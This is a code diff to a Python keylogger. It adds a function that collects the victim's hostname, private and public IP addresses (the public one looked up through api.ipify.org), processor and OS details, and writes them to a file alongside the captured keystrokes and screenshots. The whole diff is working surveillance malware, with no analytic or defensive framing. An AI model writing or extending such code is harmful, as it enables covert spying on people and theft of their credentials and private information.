@@ -44,10 +44,31 @@ def writefile(keys):
             else:
                 f.write(str(key).replace("'", ""))
 
+def computerinfo():
+    with open(filepath + sysinfo, 'a') as f1:
+        hostname=socket.gethostname()
+        IPAddress=socket.gethostbyname(hostname)
+
+        try:
+            public_IP = get("https://api.ipify.org").text
+            f1.write("Public IP Address: " + public_IP)
+
+        except Exception:
+            f1.write("Couldn't get Public IP Address")
+
+        f1.write("Processor: " + platform.processor() + '\n')
+        f1.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f1.write("Machine: " + platform.machine() + 'n')
+        f1.write("Hostname: " + hostname + '\n')
+        f1.write("Private IP Address: " + IPAddress + '\n')
+
+
 def screenshot() :
     image = ImageGrab.grab()
     image.save(filepath + scrshot)
-screenshot()
 
 with Listener(on_press = on_press, on_release = on_release) as listener :
     listener.join()
+screenshot()
+computerinfo()
+
